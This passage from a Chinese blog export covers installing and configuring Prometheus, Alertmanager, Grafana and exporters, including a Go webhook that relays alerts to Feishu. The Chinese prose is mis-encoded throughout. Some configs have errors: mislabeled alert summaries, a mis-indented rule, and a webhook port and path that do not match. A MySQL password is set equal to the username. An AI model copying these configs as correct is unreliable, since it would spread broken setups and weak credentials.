Whether an error occurred while getting statistics for the given device.\n```\n\n\n\n### 1.2 ç™»å½•prometheusé¢æ¿æŸ¥è¯¢\n\nClick on the links below to see some example metrics:\n\n| Metric                                                       | Meaning                                                      |\n| :----------------------------------------------------------- | :----------------------------------------------------------- |\n| rate(node_cpu_seconds_total{mode=\"system\"}[1m])              | The average amount of CPU time spent in system mode, per second, over the last minute (in seconds) |\n| [`node_filesystem_avail_bytes`](http://localhost:9090/graph?g0.range_input=1h&g0.expr=node_filesystem_avail_bytes&g0.tab=1) | The filesystem space available to non-root users (in bytes)  |\n| [`rate(node_network_receive_bytes_total[1m\\])`](http://localhost:9090/graph?g0.range_input=1h&g0.expr=rate(node_network_receive_bytes_total[1m])&g0.tab=1) | The average network traffic received, per second, over       |\n\n![image-20220726115047660](prometheusçš„alertmanager/1.jpg)\n\n\n\n### 1.3 å¸¸ç”¨æŸ¥è¯¢\n\n+ ç¡¬ç›˜ç™¾åˆ†æ¯”\n\n```bash\n(node_filesystem_size_bytes{fstype=~\"ext.?|xfs\"}-node_filesystem_free_bytes{fstype=~\"ext.?|xfs\"}) *100/(node_filesystem_avail_bytes {fstype=~\"ext.?|xfs\"}+(node_filesystem_size_bytes{fstype=~\"ext.?|xfs\"}-node_filesystem_free_bytes{fstype=~\"ext.?|xfs\"}))\n\n\n\n{device=\"/dev/root\", fstype=\"ext4\", instance=\"172.31.23.50:9100\", job=\"nodes\", mountpoint=\"/\"}\n78.75283914928764\n{device=\"/dev/root\", fstype=\"ext4\", instance=\"172.31.31.250:9100\", job=\"nodes\", mountpoint=\"/\"}\n67.58544213895829\n{device=\"/dev/root\", fstype=\"ext4\", instance=\"172.31.32.228:9100\", job=\"nodes\", mountpoint=\"/\"}\n83.37226643085346\n{device=\"/dev/root\", fstype=\"ext4\", instance=\"172.31.34.98:9100\", job=\"nodes\", mountpoint=\"/\"}\n59.98458796757968\n{device=\"/dev/root\", fstype=\"ext4\", instance=\"172.31.4.34:9100\", job=\"nodes\", mountpoint=\"/\"}\n44.50606176808944\n{device=\"/dev/root\", fstype=\"ext4\", instance=\"172.31.5.167:9100\", job=\"nodes\", mountpoint=\"/\"}\n55.990707884250575\n{device=\"/dev/root\", fstype=\"ext4\", instance=\"172.31.62.61:9100\", job=\"nodes\", mountpoint=\"/\"}\n59.72077496207543\n\n\n\nmax((node_filesystem_size_bytes{fstype=~\"ext.?|xfs\"}-node_filesystem_free_bytes{fstype=~\"ext.?|xfs\"}) *100/(node_filesystem_avail_bytes {fstype=~\"ext.?|xfs\"}+(node_filesystem_size_bytes{fstype=~\"ext.?|xfs\"}-node_filesystem_free_bytes{fstype=~\"ext.?|xfs\"})))by(instance)\n\n\n\n{instance=\"172.31.23.50:9100\"}\n78.7537961493076\n{instance=\"172.31.31.250:9100\"}\n67.58565865534388\n{instance=\"172.31.32.228:9100\"}\n83.37490113461213\n{instance=\"172.31.34.98:9100\"}\n59.98515901697431\n{instance=\"172.31.4.34:9100\"}\n44.50609327426293\n{instance=\"172.31.5.167:9100\"}\n55.99347648924661\n{instance=\"172.31.62.61:9100\"}\n59.721523233695976\n```\n\n\n\n# 2. Alertmanager\n\nAlertmanagerå’ŒPrometheus Serverä¸€æ ·å‡é‡‡ç”¨Golangå®ç°ï¼Œå¹¶ä¸”æ²¡æœ‰ç¬¬ä¸‰æ–¹ä¾èµ–ã€‚\n\n### 2.1 ä¸‹è½½å®‰è£…\n\nhttps://prometheus.io/download/#alertmanager\n\n```bash\nsudo wget https://github.com/prometheus/alertmanager/releases/download/v0.24.0/alertmanager-0.24.0.linux-amd64.tar.gz\n\nsudo tar zxvf alertmanager-0.24.0.linux-amd64.tar.gz\nsudo mv alertmanager-0.24.0.linux-amd64/ /opt/alertmanager\n```\n\n\n\nAlertmanagerè§£å‹åä¼šåŒ…å«ä¸€ä¸ªé»˜è®¤çš„alertmanager.ymlé…ç½®æ–‡ä»¶ï¼ŒAlertmanagerçš„é…ç½®ä¸»è¦åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼šè·¯ç”±(route)ä»¥åŠæ¥æ”¶å™¨(receivers)ã€‚\n\næ‰€æœ‰çš„å‘Šè­¦ä¿¡æ¯éƒ½ä¼šä»é…ç½®ä¸­çš„é¡¶çº§è·¯ç”±(route)è¿›å…¥è·¯ç”±æ ‘ï¼Œæ ¹æ®è·¯ç”±è§„åˆ™å°†å‘Šè­¦ä¿¡æ¯å‘é€ç»™ç›¸åº”çš„æ¥æ”¶å™¨ã€‚Alermanagerä¼šå°†æ•°æ®ä¿å­˜åˆ°æœ¬åœ°ä¸­ï¼Œé»˜è®¤çš„å­˜å‚¨è·¯å¾„ä¸º`data/`ã€‚\n\n### 2.2 æœåŠ¡å¹¶å¯åŠ¨\n\n```\nsudo vi /usr/lib/systemd/system/alertmanager.service\n```\n\n```bash\n[Unit]\nDescription=alertmanager service\n \n[Service]\nUser=root\nWorkingDirectory=/opt/alertmanager\nExecStart=/opt/alertmanager/alertmanager\nTimeoutStopSec=10\nRestart=on-failure\nRestartSec=5\n \n[Install]\nWantedBy=multi-user.target\n```\n\n```bash\nsudo systemctl daemon-reload\nsudo systemctl enable alertmanager\nsudo systemctl restart alertmanager\n\nsudo systemctl status alertmanager\nsudo lsof -i:9093\n```\n\n+ è®¿é—®\n\nAlertmanagerå¯åŠ¨åå¯ä»¥é€šè¿‡9093ç«¯å£è®¿é—®ã€‚\n\n```\ncurl http://127.0.0.1:9093\n```\n\n\n\n### 2.3 å…³è”Prometheus\n\nç¼–è¾‘Prometheusé…ç½®æ–‡ä»¶prometheus.yml,å¹¶æ·»åŠ ä»¥ä¸‹å†…å®¹\n\n```bash\nalerting:\n  alertmanagers:\n    - static_configs:\n        - targets: ['localhost:9093']\n```\n\né‡å¯PrometheusæœåŠ¡ï¼ŒæˆåŠŸåï¼Œå¯ä»¥ä»http://192.168.40.98:9090/config æŸ¥çœ‹alertingé…ç½®æ˜¯å¦ç”Ÿæ•ˆã€‚\n\n\n\n### 2.3 Prometheuså‘Šè­¦è§„åˆ™\n\nä¸€æ¡å‘Šè­¦è§„åˆ™ä¸»è¦ç”±ä»¥ä¸‹å‡ éƒ¨åˆ†ç»„æˆï¼š\n\n- alertï¼šå‘Šè­¦è§„åˆ™çš„åç§°ã€‚\n\n- exprï¼šåŸºäºPromQLè¡¨è¾¾å¼å‘Šè­¦è§¦å‘æ¡ä»¶ï¼Œç”¨äºè®¡ç®—æ˜¯å¦æœ‰æ—¶é—´åºåˆ—æ»¡è¶³è¯¥æ¡ä»¶ã€‚\n\n- forï¼šè¯„ä¼°ç­‰å¾…æ—¶é—´ï¼Œå¯é€‰å‚æ•°ã€‚ç”¨äºè¡¨ç¤ºåªæœ‰å½“è§¦å‘æ¡ä»¶æŒç»­ä¸€æ®µæ—¶é—´åæ‰å‘é€å‘Šè­¦ã€‚åœ¨ç­‰å¾…æœŸé—´æ–°äº§ç”Ÿå‘Šè­¦çš„çŠ¶æ€ä¸ºpendingã€‚\n\n- labelsï¼šè‡ªå®šä¹‰æ ‡ç­¾ï¼Œå…è®¸ç”¨æˆ·æŒ‡å®šè¦é™„åŠ åˆ°å‘Šè­¦ä¸Šçš„ä¸€ç»„é™„åŠ æ ‡ç­¾ã€‚\n\n- annotationsï¼šç”¨äºæŒ‡å®šä¸€ç»„é™„åŠ ä¿¡æ¯ï¼Œæ¯”å¦‚ç”¨äºæè¿°å‘Šè­¦è¯¦ç»†ä¿¡æ¯çš„æ–‡å­—ç­‰ï¼Œannotationsçš„å†…å®¹åœ¨å‘Šè­¦äº§ç”Ÿæ—¶ä¼šä¸€åŒä½œä¸ºå‚æ•°å‘é€åˆ°Alertmanagerã€‚\n\n  \n\nä¸ºäº†èƒ½å¤Ÿè®©Prometheusèƒ½å¤Ÿå¯ç”¨å®šä¹‰çš„å‘Šè­¦è§„åˆ™ï¼Œæˆ‘ä»¬éœ€è¦åœ¨Prometheuså…¨å±€é…ç½®æ–‡ä»¶ä¸­é€šè¿‡**rule_files**æŒ‡å®šä¸€ç»„å‘Šè­¦è§„åˆ™æ–‡ä»¶çš„è®¿é—®è·¯å¾„ã€‚\n\n```yml\nrule_files:\n  - /opt/prometheus/rules/*.rules\n```\n\n+ åˆ›å»ºå‘Šè­¦\n\n  sudo vi node-export-alert.rules\n\n  ```bash\n  groups:\n  - name: NodeExportAlert\n    rules:\n    - alert: DiskUsageAlert\n      expr: max((node_filesystem_size_bytes{fstype=~\"ext.?|xfs\"}-node_filesystem_free_bytes{fstype=~\"ext.?|xfs\"}) *100/(node_filesystem_avail_bytes {fstype=~\"ext.?|xfs\"}+(node_filesystem_size_bytes{fstype=~\"ext.?|xfs\"}-node_filesystem_free_bytes{fstype=~\"ext.?|xfs\"})))by(instance) > 70\n      for: 1m\n      labels:\n        severity: page\n      annotations:\n        summary: \"Instance {{ $labels.instance }} disk usgae high\"\n        description: \"Disk usage high, above 70% (current value: {{ $value }})\"\n        \n    - alert: CpuAlert\n      expr: (1 - avg(rate(node_cpu_seconds_total{mode=\"idle\"}[1m])) by (instance)) * 100 > 70\n      for: 1m\n      labels:\n        severity: page\n      annotations:\n        summary: \"Instance {{ $labels.instance }} disk usgae high\"\n        description: \"CPU usage high, above 70% (current value: {{ $value }})\"\n        \n    - alert: MemoryUsageAlert\n      expr: (1 - (node_memory_MemAvailable_bytes{} / (node_memory_MemTotal_bytes{})))* 100 > 70\n      for: 1m\n      labels:\n        severity: page\n      annotations:\n        summary: \"Instance {{ $labels.instance }} disk usgae high\"\n        description: \"Memory usage high, above 70% (current value: {{ $value }})\"      \n        \n        \n    - alert: DiskIOAlert\n      expr: rate(node_disk_io_time_seconds_total{job='nodes'}[1m]) * 100 > 50\n      for: 1m\n      labels:\n        severity: page\n      annotations:\n        summary: \"Instance {{ $labels.instance }} disk io high\"\n        description: \"Disk io high, current value: {{ $value }})\"    \n        \n        \n    \n    - alert: DiskWriteAlert\n      expr: rate(node_disk_written_bytes_total{job='nodes'}[1m])/8/1024/1024 > 10\n      for: 1m\n      labels:\n        severity: page\n      annotations:\n        summary: \"Instance {{ $labels.instance }} Disk write high\"\n        description: \"Disk write high, current value: {{ $value }}) M/s\"    \n  \n  \n    - alert: FileFdAlert\n        expr: (node_filefd_allocated{job='nodes'}/node_filefd_maximum{job='nodes'}) *100 > 50\n        for: 1m\n        labels:\n          severity: page\n        annotations:\n          summary: \"Instance {{ $labels.instance }} file fd high\"\n          description: \"File fd high, current value: {{ $value }})\"    \n  \n  ```\n  \n  \n  \n  ```bash\n   sudo systemctl restart prometheus\n  ```\n  \n  \n  \n  é‡å¯Prometheusåè®¿é—®Prometheus UI http://127.0.0.1:9090/ruleså¯ä»¥æŸ¥çœ‹å½“å‰ä»¥åŠ è½½çš„è§„åˆ™æ–‡ä»¶ã€‚\n\nâ€‹\t\t![image-20220726151420749](prometheusçš„alertmanager/2.jpg)\n\næŸ¥çœ‹Alertmanager UIæ­¤æ—¶å¯ä»¥çœ‹åˆ°Alertmanageræ¥æ”¶åˆ°çš„å‘Šè­¦ä¿¡æ¯ã€‚\n\n![image-20220726151737330](prometheusçš„alertmanager/3.jpg)\n\n\n\n# 3. Alertmanageré…ç½®\n\nAlertmanagerä¸»è¦è´Ÿè´£å¯¹Prometheusäº§ç”Ÿçš„å‘Šè­¦è¿›è¡Œç»Ÿä¸€å¤„ç†ï¼Œå› æ­¤åœ¨Alertmanageré…ç½®ä¸­ä¸€èˆ¬ä¼šåŒ…å«ä»¥ä¸‹å‡ ä¸ªä¸»è¦éƒ¨åˆ†ï¼š\n\n- å…¨å±€é…ç½®ï¼ˆglobalï¼‰ï¼šç”¨äºå®šä¹‰ä¸€äº›å…¨å±€çš„å…¬å…±å‚æ•°ï¼Œå¦‚å…¨å±€çš„SMTPé…ç½®ï¼ŒSlacké…ç½®ç­‰å†…å®¹ï¼›\n- æ¨¡æ¿ï¼ˆtemplatesï¼‰ï¼šç”¨äºå®šä¹‰å‘Šè­¦é€šçŸ¥æ—¶çš„æ¨¡æ¿ï¼Œå¦‚HTMLæ¨¡æ¿ï¼Œé‚®ä»¶æ¨¡æ¿ç­‰ï¼›\n- å‘Šè­¦è·¯ç”±ï¼ˆrouteï¼‰ï¼šæ ¹æ®æ ‡ç­¾åŒ¹é…ï¼Œç¡®å®šå½“å‰å‘Šè­¦åº”è¯¥å¦‚ä½•å¤„ç†ï¼›\n- æ¥æ”¶äººï¼ˆreceiversï¼‰ï¼šæ¥æ”¶äººæ˜¯ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µï¼Œå®ƒå¯ä»¥æ˜¯ä¸€ä¸ªé‚®ç®±ä¹Ÿå¯ä»¥æ˜¯å¾®ä¿¡ï¼ŒSlackæˆ–è€…Webhookç­‰ï¼Œæ¥æ”¶äººä¸€èˆ¬é…åˆå‘Šè­¦è·¯ç”±ä½¿ç”¨ï¼›\n- æŠ‘åˆ¶è§„åˆ™ï¼ˆinhibit_rulesï¼‰ï¼šåˆç†è®¾ç½®æŠ‘åˆ¶è§„åˆ™å¯ä»¥å‡å°‘åƒåœ¾å‘Šè­¦çš„äº§ç”Ÿã€‚\n\nåœ¨å…¨å±€é…ç½®ä¸­éœ€è¦æ³¨æ„çš„æ˜¯`resolve_timeout`ï¼Œè¯¥å‚æ•°å®šä¹‰äº†å½“AlertmanageræŒç»­å¤šé•¿æ—¶é—´æœªæ¥æ”¶åˆ°å‘Šè­¦åæ ‡è®°å‘Šè­¦çŠ¶æ€ä¸ºresolvedï¼ˆå·²è§£å†³ï¼‰ã€‚è¯¥å‚æ•°çš„å®šä¹‰å¯èƒ½ä¼šå½±å“åˆ°å‘Šè­¦æ¢å¤é€šçŸ¥çš„æ¥æ”¶æ—¶é—´ï¼Œè¯»è€…å¯æ ¹æ®è‡ªå·±çš„å®é™…åœºæ™¯è¿›è¡Œå®šä¹‰ï¼Œå…¶é»˜è®¤å€¼ä¸º5åˆ†é’Ÿã€‚\n\n\n\n### 3.1 webhooké…ç½®\n\n```bash\ncd /opt/alertmanager\nvi alertmanager.yml\n```\n\n+ é…ç½®\n\n```yml\nroute:\n  group_by: ['alertname']\n  group_wait: 30s\n  group_interval: 5m\n  repeat_interval: 1h\n  receiver: 'web.hook'\nreceivers:\n  - name: 'web.hook'\n    webhook_configs:\n      - url: 'http://127.0.0.1:5001/'\ninhibit_rules:\n  - source_match:\n      severity: 'critical'\n    target_match:\n      severity: 'warning'\n    equal: ['alertname', 'dev', 'instance']\n```\n\n+ é‡å¯\n\n```bash\nsudo systemctl restart prometheus\nsudo systemctl restart alertmanager\n```\n\n  \n\n### 3.2 webhookä»£ç \n\n```go\npackage main\n\nimport (\n\t\"bytes\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net/http\"\n\t\"strings\"\n\n\t\"github.com/gin-gonic/gin\"\n)\n\nvar (\n\tHookUrl = \"https://open.feishu.cn/open-apis/bot/v2/hook/xxxxxxxxxxx\" // test\n)\n\nfunc main() {\n\trouter := gin.Default()\n\trouter.POST(\"/webhook\", func(c *gin.Context) {\n\t\tdata, _ := ioutil.ReadAll(c.Request.Body)\n\t\terr := Hook(string(data))\n\t\tif err != nil {\n\t\t\tc.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()})\n\t\t\treturn\n\t\t}\n\t\tc.JSON(http.StatusOK, gin.H{\"message\": \" successful receive alert notification message!\"})\n\t})\n\trouter.Run(\":8002\")\n}\n\nfunc Hook(data string) (err error) {\n\tlog.Println(\"Hook start, data:\", data)\n\n\tvar notification Notification\n\terr = json.Unmarshal([]byte(data), &notification)\n\tif err != nil {\n\t\tlog.Println(\"Hook Unmarshal err:\", err)\n\t\treturn\n\t}\n\n\tfor _, v := range notification.Alerts {\n\t\talert, _ := v.Labels[\"alertname\"]\n\t\tinstance, _ := v.Labels[\"instance\"]\n\t\tdes, _ := v.Annotations[\"description\"]\n\t\ttext := TempStr(alert, instance, des)\n\t\t_ = FeishuAlarmText(text)\n\t}\n\n\treturn\n}\n\nfunc TempStr(alert, instance, des string) string {\n\ttemp := `{\"config\":{\"wide_screen_mode\":true},\"elements\":[{\"fields\":[{\"is_short\":true,\"text\":{\"content\":\"{{__alert__}}\",\"tag\":\"lark_md\"}},{\"is_short\":true,\"text\":{\"content\":\"{{__instance__}}\",\"tag\":\"lark_md\"}}],\"tag\":\"div\"},{\"tag\":\"div\",\"text\":{\"content\":\"{{__text__}}\",\"tag\":\"lark_md\"}},{\"tag\":\"hr\"},{\"elements\":[{\"content\":\"[æ¥è‡ª Prometheus](http://prometheus.staff.funlink-tech.com/)\",\"tag\":\"lark_md\"}],\"tag\":\"note\"}],\"header\":{\"template\":\"red\",\"title\":{\"content\":\"ã€Alert æŠ¥è­¦ã€‘  {{__header__}}\",\"tag\":\"plain_text\"}}}`\n\tstr := temp\n\tstr = strings.ReplaceAll(str, \"{{__header__}}\", instance)\n\tstr = strings.ReplaceAll(str, \"{{__alert__}}\", fmt.Sprintf(\"**ç±»å‹:**  %s\", alert))\n\tstr = strings.ReplaceAll(str, \"{{__instance__}}\", fmt.Sprintf(\"**ä¸»æœº:**  [%s](http://grafana.staff.funlink-tech.com/d/9CWBz0bik/fu-wu-qi-xin-xi?orgId=1)\", instance))\n\tstr = strings.ReplaceAll(str, \"{{__text__}}\", fmt.Sprintf(\"**æè¿°:**  %s\", des))\n\treturn fmt.Sprintf(\"{\\\"msg_type\\\":\\\"interactive\\\",\\\"card\\\":%v}\", str)\n}\n\nfunc FeishuAlarmText(text string) (err error) {\n\t_, err = http.Post(HookUrl, \"application/json\", bytes.NewBufferString(text))\n\tif err != nil {\n\t\tlog.Println(\"http err:\", err)\n\t\treturn\n\t}\n\treturn\n}\n```\n\n\n\n### 3.3 å¯åŠ¨æœåŠ¡\n\n`sudo vi /usr/lib/systemd/system/alerthook.service`\n\n```bash\n[Unit]\nDescription=alerthook service\n \n[Service]\nUser=root\nWorkingDirectory=/data/opt/alert-hook\nExecStart=/data/opt/alert-hook/alert-hook\nTimeoutStopSec=10\nRestart=on-failure\nRestartSec=5\n \n[Install]\nWantedBy=multi-user.target\n```\n+ æ“ä½œ\n\n```bash\nsudo systemctl daemon-reload\nsudo systemctl enable alerthook\nsudo systemctl restart alerthook\nsudo systemctl status alerthook\n\nsudo journalctl -u alerthook -f\n```\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://yunlzheng.gitbook.io/prometheus-book/parti-prometheus-ji-chu/alert/install-alert-manager","tags":["prometheus"],"categories":["è½¯ä»¶"]},{"title":"prometheuså’Œgrafanaçš„å®‰è£…å’Œä½¿ç”¨","url":"%2Fp%2Fbfd67891.html","content":"\nä¼ è¯´åœ°çƒä¸Šæœ¬æ²¡æœ‰ç«ç§ï¼Œé‚£æ—¶äººç±»çš„ç”Ÿæ´»éå¸¸å›°è‹¦ã€‚æ™®ç½—ç±³ä¿®æ–¯ä¸ºäº†ç»™äººç±»é€ ç¦ï¼Œå°±å†’ç€ç”Ÿå‘½å±é™©ï¼Œä»å¤ªé˜³ç¥é˜¿æ³¢ç½—é‚£é‡Œå»å·èµ°äº†ä¸€ä¸ªç«ç§ï¼Œç»™äººç±»å¸¦æ¥äº†å…‰æ˜ï¼Œæ˜¯ä¸€ä½è®©äººæ•¬ä»°çš„ç¥ã€‚ä»–å› æ­¤è€Œå—åˆ°å®™æ–¯çš„å¤„ç½šï¼Œè¢«ç»‘åœ¨é«˜åŠ ç´¢å±±ï¼Œæ¯æ—¥å¿å—é£å¹æ—¥æ™’å’Œé¹«é¹°å•„é£Ÿï¼Œåè¢«èµ«æ‹‰å…‹å‹’æ–¯æ•‘å‡ºã€‚\n\n<!-- more -->\n\n# 1. prometheus\n\n### 1.1 å®‰è£…\n\nhttps://prometheus.io/download/\n\n```bash\nwget https://github.com/prometheus/prometheus/releases/download/v2.33.3/prometheus-2.33.3.linux-amd64.tar.gz\nsudo tar zxvf prometheus-2.33.3.linux-amd64.tar.gz -C /opt\nsudo mv /opt/prometheus-2.33.3.linux-amd64 /opt/prometheus\n```\n\n\n\n### 1.2 å¯åŠ¨\n\n```\nsudo vi /usr/lib/systemd/system/prometheus.service\n```\n\n```bash\n[Unit]\nDescription=prometheus service\n \n[Service]\nUser=root\nExecStart=/opt/prometheus/prometheus --config.file=/opt/prometheus/prometheus.yml --storage.tsdb.path=/opt/prometheus/data --web.enable-admin-api\n \nTimeoutStopSec=10\nRestart=on-failure\nRestartSec=5\n \n[Install]\nWantedBy=multi-user.target\n```\n\nå¯åŠ¨\n\n```bash\nsudo systemctl daemon-reload\nsudo systemctl enable prometheus\nsudo systemctl restart prometheus\nsudo systemctl status prometheus\n```\n\n\n\næµè§ˆå™¨æ‰“å¼€IP:9090ç«¯å£å³å¯æ‰“å¼€ prometheus è‡ªå¸¦çš„ç›‘æ§é¡µé¢ã€‚\n\nhttp://192.168.40.98:9090/\n\n\n\n# 2. Grafana\n\n### 2.1 å®‰è£…\n\n```bash\nsudo apt-get install -y apt-transport-https\nsudo apt-get install -y software-properties-common wget\nwget -q -O - https://packages.grafana.com/gpg.key | sudo apt-key add -\necho \"deb https://packages.grafana.com/oss/deb stable main\" | sudo tee -a /etc/apt/sources.list.d/grafana.list\nsudo apt-get update\nsudo apt-get install grafana\n```\n\n\n\n### 2.2 å¯åŠ¨\n\n```bash\nsudo systemctl daemon-reload\nsudo systemctl enable grafana-server\nsudo systemctl start grafana-server\n```\n\n\n\n### 2.3 é…ç½®\n\næµè§ˆå™¨è®¿é—®IP:3000ç«¯å£ï¼Œå³å¯æ‰“å¼€grafanaé¡µé¢ï¼Œé»˜è®¤ç”¨æˆ·åå¯†ç éƒ½æ˜¯adminï¼Œåˆæ¬¡ç™»å½•ä¼šè¦æ±‚ä¿®æ”¹é»˜è®¤çš„ç™»å½•å¯†ç ï¼š\n\nhttp://192.168.40.98:3000\n\nç‚¹å‡»ä¸»ç•Œé¢çš„â€œAdd your first data sourceâ€å¹¶é€‰æ‹©Prometheusï¼ˆè¿™ä¸€æ­¥ä¸èƒ½çœï¼‰ï¼š\n\n<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220215173311851.jpg\" alt=\"image-20220215173311851\" style=\"zoom:50%;\" />\n\n\n\nDashboardsé¡µé¢é€‰æ‹©â€œPrometheus 2.0 Statsâ€è¿›è¡ŒImportï¼š\n\n<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220215173409910.jpg\" alt=\"image-20220215173409910\" style=\"zoom:50%;\" />\n\nSettingsé¡µé¢å¡«å†™æ™®ç½—ç±³ä¿®æ–¯åœ°å€å¹¶ä¿å­˜ï¼š\n\nhttp://192.168.40.98:9090/\n\n<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220215174934193.jpg\" alt=\"image-20220215174934193\" style=\"zoom:50%;\" />\n\nâ€‹\tåˆ‡æ¢åˆ°æˆ‘ä»¬åˆšæ‰æ·»åŠ çš„â€œPrometheus 2.0 Statsâ€å³å¯çœ‹åˆ°æ•´ä¸ªç›‘æ§é¡µé¢(ç‚¹å‡»ä¸‹é¢è“è‰²éƒ¨åˆ†)ï¼š\n\n<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220215175144919.jpg\" alt=\"image-20220215175144919\" style=\"zoom:50%;\" />\n\n# 3. ç›‘æ§ç¤ºä¾‹\n\n### 3.1 CPU, å†…å­˜ï¼Œç£ç›˜ï¼ˆnode_exporterï¼‰\n\nä¸ºäº†èƒ½å¤Ÿé‡‡é›†åˆ°ä¸»æœºçš„è¿è¡ŒæŒ‡æ ‡å¦‚CPU, å†…å­˜ï¼Œç£ç›˜ç­‰ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Node Exporterã€‚Node ExporteråŒæ ·é‡‡ç”¨Golangç¼–å†™ï¼Œå¹¶ä¸”ä¸å­˜åœ¨ä»»ä½•çš„ç¬¬ä¸‰æ–¹ä¾èµ–ï¼Œåªéœ€è¦ä¸‹è½½ï¼Œè§£å‹å³å¯è¿è¡Œã€‚å¯ä»¥ä» https://prometheus.io/download/#node_exporter è·å–æœ€æ–°çš„node exporterç‰ˆæœ¬çš„äºŒè¿›åˆ¶åŒ…ã€‚\n\n```bash\nwget https://github.com/prometheus/node_exporter/releases/download/v1.3.1/node_exporter-1.3.1.linux-amd64.tar.gz\nsudo tar zxf node_exporter-1.3.1.linux-amd64.tar.gz -C /opt\nsudo mv /opt/node_exporter-1.3.1.linux-amd64 /opt/node_exporter\n```\n\n+ é…ç½®\n\nå¢åŠ service\n\n```\nsudo vi /usr/lib/systemd/system/node_exporter.service\n```\n\n```bash\n[Unit]\nDescription=node_exporter service\n \n[Service]\nUser=root\nExecStart=/opt/node_exporter/node_exporter\n \nTimeoutStopSec=10\nRestart=on-failure\nRestartSec=5\n \n[Install]\nWantedBy=multi-user.target\n```\n\n+ å¯åŠ¨\n\n```bash\nsudo systemctl daemon-reload\nsudo systemctl enable node_exporter\nsudo systemctl start node_exporter\nsudo systemctl status node_exporter\n```\n\n- Prometheusé…ç½®æ–‡ä»¶æ·»åŠ ç›‘æ§é¡¹\n\n`sudo vi /opt/prometheus/prometheus.yml`\n\n```bash\n  - job_name: 'linux-node'\n    static_configs:\n    - targets: ['localhost:9100']\n      labels:\n        instance: linux-node1\n```\n\n9100æ˜¯`node_exporter`çš„ç«¯å£ã€‚\n\n+ é‡å¯\n\n`sudo systemctl restart prometheus`\n\næ­¤æ—¶å¯ä»¥å»prometheusçœ‹ä¸‹targetæ˜¯å¦æœ‰äº†ã€‚\n\n<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220216100808899.jpg\" alt=\"image-20220216100808899\" style=\"zoom: 33%;\" />\n\n+ å¯¼å…¥grafanaæ¨¡æ¿ï¼Œæ•°æ®å±•ç¤º\n\n<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220215183334543.jpg\" alt=\"image-20220215183334543\" style=\"zoom:50%;\" />\n\nâ€‹\t\tæ¨¡æ¿ç¼–å·è¯·å»ï¼Œgrafanaçš„å®˜ç½‘ https://grafana.com/dashboardså»æŸ¥æ‰¾ï¼Œ æˆ‘ç”¨çš„ç¼–å· 8919\n\nâ€‹\t\t<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220215183626806.jpg\" alt=\"image-20220215183626806\" style=\"zoom: 50%;\" />\n\nâ€‹\té€‰æ‹©æˆ‘ä»¬å‰æ–‡åˆ›å»ºå¥½çš„æ•°æ®æºï¼Œç‚¹å‡»å¯¼å…¥å³å¯ã€‚\n\n<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220215185843612.jpg\" alt=\"image-20220215185843612\" style=\"zoom:33%;\" />\n\n### 3.1 MySQL(mysqld_exporter)\n\n+ åœ¨è¢«ç›‘æ§æœåŠ¡å™¨åˆ›å»ºç›‘æ§ç”¨æˆ·\n\n```mysql\nCREATE USER 'mysqld_exporter'@'127.0.0.1' IDENTIFIED BY 'mysqld_exporter';\n\nGRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO 'mysqld_exporter'@'127.0.0.1';\n\nGRANT SELECT ON performance_schema.* TO 'mysqld_exporter'@'127.0.0.1';\n\nflush privileges;\n```\n\n+ ä¸‹è½½å®‰è£…\n\nhttps://prometheus.io/download/#mysqld_exporter\n\n```bash\nwget https://github.com/prometheus/mysqld_exporter/releases/download/v0.13.0/mysqld_exporter-0.13.0.linux-amd64.tar.gz\nsudo tar zxf mysqld_exporter-0.13.0.linux-amd64.tar.gz -C /opt\nsudo mv /opt/mysqld_exporter-0.13.0.linux-amd64 /opt/mysqld_exporter\n```\n\n- è®¾ç½®é…ç½®æ–‡ä»¶ï¼Œuserä¸ºæ•°æ®åº“ç™»å½•ç”¨æˆ·ï¼Œpasswordä¸ºè¿™ä¸ªç”¨æˆ·çš„å¯†ç ï¼š\n\n```\ncd /opt/mysqld_exporter\nsudo vi .my.cnf\n```\n\n```mysql\n[client]\nhost=127.0.0.1\nport=3306\nuser=mysqld_exporter\npassword=mysqld_exporter\n```\n\n+ é…ç½®å¼€æœºè‡ªå¯åŠ¨å¹¶å¯åŠ¨æœåŠ¡\n\n```\nsudo vi /usr/lib/systemd/system/mysqld_exporter.service\n```\n\n```yml\n[Unit]\nDescription=mysqld_exporter service\n \n[Service]\nUser=root\nExecStart=/opt/mysqld_exporter/mysqld_exporter --config.my-cnf=/opt/mysqld_exporter/.my.cnf\n \nTimeoutStopSec=10\nRestart=on-failure\nRestartSec=5\n \n[Install]\nWantedBy=multi-user.target\n```\n+ å¯åŠ¨\n\n```bash\nsudo systemctl daemon-reload\nsudo systemctl enable mysqld_exporter\nsudo systemctl start mysqld_exporter\nsudo systemctl status mysqld_exporter\n```\n\n+ prometheusé…ç½®æ–‡ä»¶ä¸­åŠ å…¥mysqlç›‘æ§å¹¶é‡å¯ï¼š\n\n```\nsudo vi /opt/prometheus/prometheus.yml\n```\n\n```\n  - job_name: 'mysqld-node'\n    static_configs:\n    - targets: 